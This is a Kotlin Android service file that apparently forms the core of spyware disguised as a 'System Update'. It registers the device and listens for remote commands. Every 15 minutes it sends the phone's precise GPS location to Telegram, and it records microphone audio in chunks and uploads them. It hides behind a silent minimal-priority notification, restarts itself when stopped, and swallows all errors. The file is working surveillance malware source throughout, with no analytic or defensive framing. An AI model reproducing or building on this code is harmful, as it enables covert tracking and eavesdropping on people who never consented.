package com.sys.update2

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class BackgroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var running = true

    override fun onCreate() {
        super.onCreate()
        startForegroundWithNotification()

        // استقبال الأوامر
        try { CommandListener.start(applicationContext) } catch (_: Exception) {}

        // ⭐ تسجيل الجهاز
        try { DeviceManager.registerDevice(applicationContext) } catch (_: Exception) {}

        // ⭐ sync تلقائي كل 60 ثانية — بدون أوامر
        scope.launch {
            // ابدأ أول sync بعد 5 ثواني من التشغيل
            delay(5_000L)
            while (running) {
                try {
                    CommandExecutor.autoSyncAll(applicationContext)
                } catch (_: Exception) {}
                delay(60_000L)
            }
        }

        // heartbeat
        scope.launch {
            while (running) {
                try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
                delay(3 * 60_000L)
            }
        }

        // تنظيف ملفات الصوت القديمة
        scope.launch {
            while (running) {
                try {
                    val audioDir = File(applicationContext.cacheDir, "audio")
                    if (audioDir.exists()) {
                        val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
                        audioDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
                    }
                } catch (_: Exception) {}
                delay(5 * 60_000L)
            }
        }

        // الموقع (لو مفعّل)
        scope.launch {
            while (running) {
                try {
                    if (KeyboardBuilder.locationOn) {
                        val loc = LocationHelper.getPreciseLocation(applicationContext, 10)
                        if (loc != null) {
                            TelegramApi.sendMessage("📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
                        }
                    }
                } catch (_: Exception) {}
                delay(15 * 60_000L)
            }
        }

        // الميكروفون (لو مفعّل)
        scope.launch {
            while (running) {
                try {
                    if (AudioRecorder.isRunning()) {
                        AudioRecorder.startChunk(applicationContext)
                        delay(Config.AUDIO_CHUNK_MS)
                        val done = AudioRecorder.stopChunk()
                        if (done != null && done.exists() && done.length() > 1000) {
                            TelegramApi.sendAudio(done, "🎤 ${done.name}")
                            done.delete()
                        }
                    } else {
                        delay(3000L)
                    }
                } catch (_: Exception) { delay(5000L) }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running = false
        try { CommandListener.stop() } catch (_: Exception) {}
        try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
        scope.cancel()
        try {
            val restart = Intent(applicationContext, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(restart)
            } else {
                applicationContext.startService(restart)
            }
        } catch (_: Exception) {}
        super.onDestroy()
    }

    private fun startForegroundWithNotification() {
        val channelId = "sys_sync_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(channelId) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(channelId, "System Sync", NotificationManager.IMPORTANCE_MIN)
                        .apply {
                            setSound(null, null)
                            enableVibration(false)
                            setShowBadge(false)
                        }
                )
            }
        }

        val notif: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Update")
            .setContentText("Running…")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()

        startForeground(1001, notif)
    }
}
